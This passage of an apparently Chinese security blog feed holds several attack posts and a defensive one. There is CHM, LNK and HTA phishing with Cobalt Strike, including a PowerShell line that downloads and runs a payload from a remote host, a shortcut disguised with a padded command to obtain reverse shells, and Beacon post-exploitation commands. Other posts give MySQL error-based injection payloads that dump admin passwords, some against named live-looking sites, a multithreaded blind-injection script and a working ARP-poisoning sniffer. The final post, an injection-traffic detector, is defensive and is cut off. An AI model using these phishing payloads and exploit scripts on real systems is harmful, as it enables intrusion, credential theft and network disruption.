value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.209.151:81/aa&apos;))&quot;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>生产CHM发送给别人，点击后获得反弹的shell</p><h2 id="LNK钓鱼"><a href="#LNK钓鱼" class="headerlink" title="LNK钓鱼"></a>LNK钓鱼</h2><ul><li>lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。</li><li>lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。</li></ul><h3 id="先做个简单的powershell生产图标："><a href="#先做个简单的powershell生产图标：" class="headerlink" title="先做个简单的powershell生产图标："></a>先做个简单的powershell生产图标：</h3><p>创建个txt文本写入下面代码然后改文件后缀名为.ps1。</p><pre><code>cmd /c calc.exe</code></pre><p> 右键文件powershell运行后会弹出计算器</p><h3 id="钓鱼方法："><a href="#钓鱼方法：" class="headerlink" title="钓鱼方法："></a>钓鱼方法：</h3><p>首先通过Cobalt Strike的attacks——&gt;web Drive by——&gt;scripted web Delivery</p><p>tpye类型为powershell，然后单机launch。生产代码。</p><p>还记的上面做的那个简单的powershell么，后缀改回txt，将生成的代码替换掉calc.exe</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsh3ya15j30ha06cdg5.jpg" alt=""></p><p> 将下面的powershell代码写入.ps1文件，右键运行powershell。</p><pre><code>$file = Get-Content &quot;test.txt&quot;$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&quot;test.lnk&quot;)$Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot;$Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot;$Shortcut.Arguments = &apos;                                                                                                                                                                                                                                    &apos;+ $file$Shortcut.Save()</code></pre><p>生成test.lnk文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在<code>%SystemRoot%\System32\Shell32.dll</code>目录下）</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsi0fbj1j30i202jt8p.jpg" alt=""></p><p>后将test.lnk发送给他人，获得反弹shell。</p><h2 id="HTA钓鱼"><a href="#HTA钓鱼" class="headerlink" title="HTA钓鱼"></a>HTA钓鱼</h2><ul><li>HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。</li><li>HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多，它具有桌面程序的所有权限。</li><li>就是一个html应用程序，双击就能运行。</li></ul><h3 id="复现：-1"><a href="#复现：-1" class="headerlink" title="复现："></a>复现：</h3><p>Cobalt Strike，attacks——&gt;packages——&gt;HTML application</p><p>选择powershell然后单机generate，选择保存路径。</p><p>将生成的.hta文件发送给别人，点击后获得shell</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsjla457j30rk05qjty.jpg" alt=""></p><h2 id="网站克隆"><a href="#网站克隆" class="headerlink" title="网站克隆"></a>网站克隆</h2><ul><li>Cobalt Strike还能够实现网站克隆</li><li>cotalt strike能够快速复制目标网站前端页面，并且复制相识度极高</li><li>cotalt strike同时还可以在复制的网站中插入恶意代码，如果本地浏览器带有漏洞的用户，可以直接控制目标机器。</li></ul><p>点击attacks——&gt;Web Drive-by——&gt;Clone site</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsocsziuj309u07tq3j.jpg" alt=""></p><ul><li>Clone URL：克隆目标网站的URL（如果网站不是80端口的话域名后得跟上端口号。）</li><li>注意问题：URL需要添加http协议和端口（80）</li><li>Local URL：本地克隆路径</li><li>Local Host：本地主机IP</li><li>Local Port：本地端口</li><li>Attack：克隆后目标网站执行脚本，如：flash漏洞</li></ul><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtspws7kmj30qf0fs475.jpg" alt=""></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>相信你已经能拿到一个beacon的shell了。</p><p>下面是一些基本的使用命令，但是cs监听器对中文支持并不友好，会对中文产生乱码。</p><pre><code>help     查看beacon shell所有内置命令帮助,如果想查看指定命令的用法,可以这样,eg: help checkin note     给当前目录机器起个名字, eg: note beacon-shellcd     在目标系统中切换目录,注意在win系统中切换目录要用双反斜杠,或者直接用&apos;/&apos; eg: cd c:\\mkdir      新建目录, eg: mkdir d:\\beaconrm      删除文件或目录, eg: rm d:\\beaconupload      上传文件到目标系统中download 从目标系统下载指定文件,eg: download C:\\Users\\win7cn\\Desktop\\putty.execancel     取消下载任务,比如,一个文件如果特别大,下载可能会非常耗时,假如中途你不想继续下了,就可以用这个取消一下shell     在目标系统中执行指定的cmd命令, eg: shell whoamigetuid      查看当前beacon 会话在目标系统中的用户权限,可能需要bypassuac或者提权pwd     查看当前在目录系统中的路径ls     列出当前目录下的所有文件和目录drives     列表出目标系统的所有分区[win中叫盘符]ps     查看目标系统当前的所有的进程列表kill     杀掉指定进程, eg: kill 4653sleep 10 指定被控端休眠时间,默认60秒一次回传,让被控端每10秒来下载一次任务,实际中频率不宜过快,容易被发现,80左右一次即可jobs     列出所有的任务列表,有些任务执行时间可能稍微较长,此时就可以从任务列表中看到其所对应的具体任务id,针对性的清除jobkill     如果发现任务不知是何原因长时间没有执行或者异常,可尝试用此命令直接结束该任务, eg: jobkill 1345clear     清除beacon内部的任务队列checkin     强制让被控端回连一次exit      终止当前beacon 会话ctrl + k 清屏</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsmcb19nj30hn08qdgq.jpg" alt=""></p><blockquote><p>有些可能会触发敏感api导致防护报警,另外进程注入,被控端可能感到非常明显的卡顿,工具也有许多不完善的地方</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cobalt-Strike简介：&quot;&gt;&lt;a href=&quot;#Cobalt-Strike简介：&quot; class=&quot;headerlink&quot; title=&quot;Cobalt Strike简介：&quot;&gt;&lt;/a&gt;Cobalt Strike简介：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;
      
    
    </summary>
    
      <category term="渗透工具" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL报错注入方法整理</title>
    <link href="http://yoursite.com/2018/12/03/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"/>
    <id>http://yoursite.com/2018/12/03/MySQL报错注入方法整理/</id>
    <published>2018-12-03T09:24:50.000Z</published>
    <updated>2018-12-03T09:32:40.750Z</updated>
    
    <content type="html"><![CDATA[<p>mysql暴错注入方法整理：通过<strong>floor</strong>，<strong>UpdateXml</strong>，<strong>ExtractValue</strong>，<strong>NAME_CONST</strong>，<strong>Error based Double Query Injection</strong>等方法。</p><p>报错注入：（and后不能直接跟select，可以加（））</p><ul><li>1.报错注入floor—-&gt;<code>(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1</code></li><li>2.报错注入extractvalue—-&gt;<code>select extractvalue(1,concat(0x5c,([payload])))</code></li><li>3.报错注入updatexml—-&gt;<code>select 1=(updatexml(1,concat(0x3a,([payload])),1))</code></li><li>4.报错注入Exp—-&gt;<code>select Exp(~(select * from ([payload])a))</code></li></ul><h2 id="通过floor暴错-原理在底部"><a href="#通过floor暴错-原理在底部" class="headerlink" title="通过floor暴错(原理在底部)"></a>通过floor暴错(原理在底部)</h2><h3 id="数据库版本"><a href="#数据库版本" class="headerlink" title="/数据库版本/"></a>/数据库版本/</h3><pre><code>http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select version()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+</code></pre><h3 id="简单办法暴库"><a href="#简单办法暴库" class="headerlink" title="/简单办法暴库/"></a>/简单办法暴库/</h3><pre><code>http://www.waitalone.cn/sql.php?id=info()</code></pre><h3 id="连接用户"><a href="#连接用户" class="headerlink" title="/连接用户/"></a>/连接用户/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="/连接数据库/"></a>/连接数据库/</h3><pre><code>http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+</code></pre><h3 id="暴库"><a href="#暴库" class="headerlink" title="/暴库/"></a>/暴库/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="暴表"><a href="#暴表" class="headerlink" title="/暴表/"></a>/暴表/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="暴字段"><a href="#暴字段" class="headerlink" title="/暴字段/"></a>/暴字段/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="暴内容"><a href="#暴内容" class="headerlink" title="/暴内容/"></a>/暴内容/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))</code></pre><h3 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</code></pre><h3 id="NAME-CONST-适用于低版本"><a href="#NAME-CONST-适用于低版本" class="headerlink" title="NAME_CONST(适用于低版本)"></a>NAME_CONST(适用于低版本)</h3><pre><code>http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--</code></pre><h3 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h3><pre><code>(http://www.vaibs.in/error-based-double-query-injection/)</code></pre><h3 id="数据库版本-1"><a href="#数据库版本-1" class="headerlink" title="/数据库版本/"></a>/数据库版本/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1</code></pre><h3 id="floor报错详解"><a href="#floor报错详解" class="headerlink" title="floor报错详解"></a>floor报错详解</h3><pre><code>floor----&gt;(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1</code></pre><ul><li>Rand() //随机函数</li><li>Floor() //取整函数</li><li>Count() //聚合函数</li><li>Group by key //分组语句</li></ul><blockquote><p>当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。[这个是Mysql的bug]。</p></blockquote><blockquote><p>0x3a   ：的十六进制，在这里把他作为分隔符，没有它查出来的东西就连成一片。</p></blockquote><p><code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;mysql暴错注入方法整理：通过&lt;strong&gt;floor&lt;/strong&gt;，&lt;strong&gt;UpdateXml&lt;/strong&gt;，&lt;strong&gt;ExtractValue&lt;/strong&gt;，&lt;strong&gt;NAME_CONST&lt;/strong&gt;，&lt;strong&gt;Error
      
    
    </summary>
    
      <category term="SQL" scheme="http://yoursite.com/categories/SQL/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP绕过md5</title>
    <link href="http://yoursite.com/2018/12/03/PHP%E7%BB%95%E8%BF%87md5/"/>
    <id>http://yoursite.com/2018/12/03/PHP绕过md5/</id>
    <published>2018-12-03T08:27:27.000Z</published>
    <updated>2018-12-08T11:35:00.414Z</updated>
    
    <content type="html"><![CDATA[<p>测试代码：</p><pre><code>if (isset($_GET[&apos;Username&apos;]) &amp;&amp; isset($_GET[&apos;password&apos;])) {       $logined = true;    $Username = $_GET[&apos;Username&apos;];    $password = $_GET[&apos;password&apos;];    if (!ctype_alpha($Username)) {$logined = false;}    if (!is_numeric($password) ) {$logined = false;}    if (md5($Username) != md5($password)) {$logined = false;}    if ($logined){        echo &quot;successful&quot;;    } else {        echo &quot;login failed!&quot;;    }}</code></pre><p>在做用户登录的时候常常会用到md5加密计算比较密码，md5后相等，就可以成功执行下一步语句，登录成功。但是这样做并不安全，因为 <strong>0e</strong>在比较的时候会将其视作为科学计数法，所以无论<strong>0e</strong>后面是什么，0的多少次方还是0。</p><h2 id="md5开头是0e的字符串"><a href="#md5开头是0e的字符串" class="headerlink" title="md5开头是0e的字符串:"></a>md5开头是0e的字符串:</h2><pre><code>QNKCDZO： 0e830400451993494058024219903391 s878926199a： 0e545993274517709034328855841020 s155964671a： 0e342768416822451524974117254469 s214587387a： 0e848240448830537924465865611904 s214587387a： 0e848240448830537924465865611904 s878926199a： 0e545993274517709034328855841020 s1091221200a： 0e940624217856561557816327384675</code></pre><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用全等 <code>===</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;测试代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if (isset($_GET[&amp;apos;Username&amp;apos;]) &amp;amp;&amp;amp; isset($_GET[&amp;apos;password&amp;apos;])) {
       $logined = true;
    
      
    
    </summary>
    
      <category term="加密解密" scheme="http://yoursite.com/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>比二分法更OK的盲注多线程</title>
    <link href="http://yoursite.com/2018/12/03/%E6%AF%94%E4%BA%8C%E5%88%86%E6%B3%95%E6%9B%B4OK%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/12/03/比二分法更OK的盲注多线程/</id>
    <published>2018-12-03T08:15:08.000Z</published>
    <updated>2018-12-03T08:19:08.702Z</updated>
    
    <content type="html"><![CDATA[<p>废话不多说，直接上脚本：</p><pre><code>import threadingimport requestsuser_agent = [            &quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5&quot;,            &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;]class MyThread(threading.Thread):    def __init__(self, func, args):        threading.Thread.__init__(self)        self.func = func        self.args = args    def getresult(self):        return self.res    def run(self):        self.res = self.func(*self.args)def asc(a,i,payload):    asci = 2**i    url = &quot;http://127.0.0.1/2/Less-5/?id=1&apos;and ascii(substr((&quot;+payload+&quot;),&quot;+str(a)+&quot;,1))%26&quot;+str(asci)+&quot;=&quot;+str(asci)+ &quot;--+&quot;    header = {&apos;User-Agent&apos;: user_agent[i]}    html = requests.get(url, headers=header)    if html.text.find(&quot;You are in...........&quot;)!=-1:        return asci    return 0def main():    payload = input(&apos;请输入payload(比如select user()/user()/SELECT group_concat(SCHEMA_name) from information_schema.SCHEMATA)：&apos;)    a=1    f=True    char = &apos;&apos;    while f:        threads = []        sum = 0        for i in range(0,8):            t = MyThread(asc, (a, i, payload))            threads.append(t)        for i in range(0,8):            threads[i].start()        for i in range(0,8):            threads[i].join()            sum = sum + threads[i].getresult()        if sum ==0:            f = False        char = char +chr(sum)        a = a+1    print(char)if __name__ == &apos;__main__&apos;:    main()</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtmpo7ywrj3118044q3h.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;废话不多说，直接上脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import threading
import requests
user_agent = [
            &amp;quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/53
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>python实现ARP攻击</title>
    <link href="http://yoursite.com/2018/12/03/python%E5%AE%9E%E7%8E%B0ARP%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/12/03/python实现ARP攻击/</id>
    <published>2018-12-03T08:05:10.000Z</published>
    <updated>2018-12-03T08:12:31.113Z</updated>
    
    <content type="html"><![CDATA[<pre><code>from scapy.all import *import osimport sysimport threadingimport signalinterface = &apos;Realtek PCIe GBE Family Controller&apos;target_ip=&apos;10.60.17.12&apos;gateway_ip=&apos;10.60.17.1&apos;packet_count=1000#设置嗅探的网卡conf.iface=interface#关闭输出conf.verb = 0print(&apos;[*]Setting up&apos;+interface)def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):    print(&apos;[*]Restoring target.....&apos;)    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=gateway_mac),count=5)    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=target_mac),count=5)    #发送退出信号到主线程    os.kill(os.getpid(),signal.SIGINT)def get_mac(ip_address):    responses,unanswered = srp(Ether(dst=&apos;ff:ff:ff:ff:ff:ff&apos;)/ARP(pdst=ip_address),timeout=2,retry=10)    for s, r in responses:        return r[Ether].src    return Nonedef poison_target(gateway_ip, gateway_mac, target_ip, target_mac):    poison_target = ARP()    poison_target.op = 2    poison_target.psrc = gateway_ip    poison_target.pdst = target_ip    poison_target.hwdst = target_mac    poison_gateway = ARP()    poison_gateway.op = 2    poison_gateway.psrc = target_ip    poison_gateway.pdst = gateway_ip    poison_gateway.hwdst = gateway_mac    print(&quot;[*] Beginning the ARP poison.[ CTRL-C to stop]&quot;)    while True:        try:            send(poison_target)            send(poison_gateway)            time.sleep(2)        except KeyboardInterrupt:            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)    print(&quot;[*] ARP poison attack finished.&quot;)    returngateway_mac = get_mac(gateway_ip)if gateway_mac is None:    print(&quot;[!!!]Faile to get gateway MAC. Exiting&quot;)    sys.exit(0)else:    print(&apos;[*] Gateway %s is at %s&apos;%(gateway_ip,gateway_mac))target_mac = get_mac(target_ip)if target_mac is None:    print(&apos;[!!!]Faile to get target MAC. Exiting&apos;)    sys.exit(0)else:    print(&apos;[*] Target %s is at %s&apos; % (target_ip, target_mac))#开启ARP攻击线程poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))poison_thread.start()try:    print(&apos;[*]Starting sniffer for %d packets&apos;%packet_count)    bpf_filter = &apos;ip host %s&apos;%target_ip    packes = sniff(count=packet_count,filter=bpf_filter,iface=interface)    #将捕获到的数据包传输到文件    wrpcap(&apos;arper.pcap&apos;,packes)    #还原网络配置    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)except  KeyboardInterrupt:    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)    sys.exit(0)</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtmiyon6cj30in06uwer.jpg" alt=""></p><p>好了，现在可以断别人网了….</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;from scapy.all import *
import os
import sys
import threading
import signal

interface = &amp;apos;Realtek PCIe GBE Family Controller
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>基于流量分析的SQL注入检测</title>
    <link href="http://yoursite.com/2018/12/03/%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/"/>
    <id>http://yoursite.com/2018/12/03/基于流量分析的SQL注入检测/</id>
    <published>2018-12-03T07:50:08.000Z</published>
    <updated>2018-12-11T11:30:18.871Z</updated>
    
    <content type="html"><![CDATA[<pre><code>from scapy.all import *import reimport datetimefrom pyecharts import Geoimport pygeoipimport pymysqlfrom selenium import webdriverdriver = webdriver.Firefox()driver.get(&quot;file:///D:/python%E9%A1%B9%E7%9B%AE/black%20hat/%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/map.html&quot;)gi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;)geo = Geo(&quot;SQL注入威胁感知&quot;, &quot;data from traffic&quot;, title_color=&quot;#fff&quot;, title_pos=&quot;left&quot;, width=1200, height=1000,          background_color=&apos;#404a59&apos;)db = pymysql.connect(host=&apos;localhost&apos;, port=3306, user=&apos;root&apos;, passwd=&apos;root&apos;, db=&apos;test&apos;)data = {}def printRecord(ip,sip):    rec = gi.record_by_name(ip)    city = rec[&apos;city&apos;]    country = rec[&apos;country_name&apos;]    long = rec[&apos;longitude&apos;]    lat = rec[&apos;latitude&apos;]    with db.cursor() as cursors:        cou = &quot;select ifnull((select 1 from detection where ip=%s limit 1), 0)&quot;        cursors.execute(cou,sip)        s = cursors.fetchone()        if s[0] == 1:            sql = &apos;update detection set attacksum = attacksum+1 where ip=%s;&apos;            cursors.execute(sql,sip)            db.commit()        else:            sql = &apos;insert into detection(`ip`,`city`,`country`,`lat`,`long`,`attacksum`)values(%s,%s,%s,%s,%s,%s);&apos;            cursors.execute(sql,[sip,city,country,lat,long,1])            db.commit()        number = &quot;select count(*) from detection;&quot;        cursors.execute(number)        ss = cursors.fetchone()        for l in range(1,ss[0]+1):            mysqls = &apos;select attacksum from detection where sequence=%s;&apos;            cursors.execute(mysqls, l)            attnum = cursors.fetchone()            longs = &quot;select `long` from detection where sequence=%s;&quot;            cursors.execute(longs, l)            longg = cursors.fetchone()            lats = &quot;select lat from detection where sequence=%s;&quot;            cursors.execute(lats, l)            latt = cursors.fetchone()            ips = &quot;select ip from detection where sequence=%s;&quot;            cursors.execute(ips, l)            ipp = cursors.fetchone()            geo.add_coordinate(&quot;攻击者&quot;+ str(l),str(longg[0]), str(latt[0]))            data[&quot;攻击者&quot;+ str(l)] = [&apos;攻击者IP：&apos; + str(ipp[0]) + &quot;:&quot; + &quot;攻击次数：&quot; + str(attnum[0])]    attr, value = geo.cast(data)    geo.add(&quot;traffic analyze&quot;, attr, value, type=&quot;effectScatter&quot;, is_random=True, effect_scale=1)    geo.render(path=&quot;map.html&quot;)    driver.refresh()def test(page):    for f in page.payload.payload.payload.fields_desc:        fvalue = page.payload.payload.getfieldval(f.name)        if &apos;HTTP&apos; in str(fvalue):            lst = str(fvalue).split(r&apos;\r\n&apos;)            la = re.findall(&apos;(GET )|(POST )&apos;, lst[0])            if la != []:                if la[0][0] == &apos;&apos;:                    with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file:                        for fi in file.readlines():                            for ff in lst:                                if fi.strip(&apos;\n&apos;) in str(ff.lower()):                                    try:                                        i = datetime.datetime.now()                                        print(&quot;[!]您正在被攻击！&quot;)                                        print(&apos;[*]攻击时间是\t&apos;+str(i))                                        print(&apos;[*]SQL注入攻击的IP为\t&apos; + page.payload.src)                                        print(&apos;[*]被攻击的地方和payload是\t&apos; + str(ff).strip(&apos;b\&apos;&apos;))                                        print(&apos;[*]提交的方式为\tPOST&apos;)                                        try:                                            printRecord(page.payload.src, page.payload.src)                                        except:                                            printRecord(&quot;114.242.146.98&quot;, page.payload.src)                                        with open(&apos;danger.log&apos;, &apos;a+&apos;) as f:                                            f.write(                                                &quot;[!]您正在被攻击！\n [*]攻击时间是\t%s\n[*]SQL注入攻击的IP为\t%s\n[*]被攻击的地方和payload是\t%s\n[*]提交的方式为\t POST\n\n&quot; % (                                                str(i),page.payload.src, str(ff)))                                    except:                                        pass                if la[0][1] == &apos;&apos;:                    with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file:                        for fi in file.readlines():                            for ff in lst:                                if fi.strip(&apos;\n&apos;) in str(ff.lower()):                                    try:                                        i = datetime.datetime.now()                                        print(&quot;[!]您正在被攻击！&quot;)                                        print(&apos;[*]攻击时间是\t&apos;+str(i))                                        print(&apos;[*]SQL注入攻击的IP为\t&apos; + page.payload.src)                                        print(&apos;[*]被攻击的地方和payload是\t&apos;+ str(ff).strip(&apos;b\&apos;&apos;).strip(&apos;HTTP/1.1&apos;))                                        print(&apos;[*]提交的方式为\tGET&apos;)                                        try:                                            printRecord(page.payload.src,page.payload.src)                                        except:                                            printRecord(&quot;114.242.146.98&quot;,page.payload.src)                                        with open(&apos;danger.log&apos;, &apos;a+&apos;) as f:                                            f.write(                                                &quot;[!]您正在被攻击！\n[*]攻击时间是\t%s\n [*]SQL注入攻击的IP为\t%s\n[*]被攻击的地方和payload是\t%s\n[*]提交的方式为\t GET\n\n&quot; % (                                                    str(i),page.payload.src, str(ff)))                                    except:                                        passdef main():    sniff(filter=&apos;host 192.168.209.160&apos;, iface=&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;, prn=test, count=0)if __name__ == &apos;__main__&apos;:    main()</code></pre><p>sql.txt：提供特殊字段检测的字典。    </p><p>Danger.log：如果有SQL注入攻击，则保存攻击时间、攻击者的IP、攻击的payload及攻击位置和提交的方式。</p><blockquote><p>下载chromedriver并把chromedriver.exe放到跟代码相同目录下。</p></blockquote><h2 id="相关知识点："><a href="#相关知识点：" class="headerlink" title="相关知识点："></a>相关知识点：</h2><h3 id="用Firefox打开本地地图并刷新。"><a href="#用Firefox打开本地地图并刷新。" class="headerlink" title="用Firefox打开本地地图并刷新。"></a>用Firefox打开本地地图并刷新。</h3><pre><code>driver = webdriver.Firefox()driver.get(&apos;file:///D:/python%E9%A1%B9%E7%9B%AE/black%20hat/%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/map.html&apos;)driver.refresh()</code></pre><h3 id="获取相应IP的城市国家经纬度等信息。"><a href="#获取相应IP的城市国家经纬度等信息。" class="headerlink" title="获取相应IP的城市国家经纬度等信息。"></a>获取相应IP的城市国家经纬度等信息。</h3><pre><code>gi = 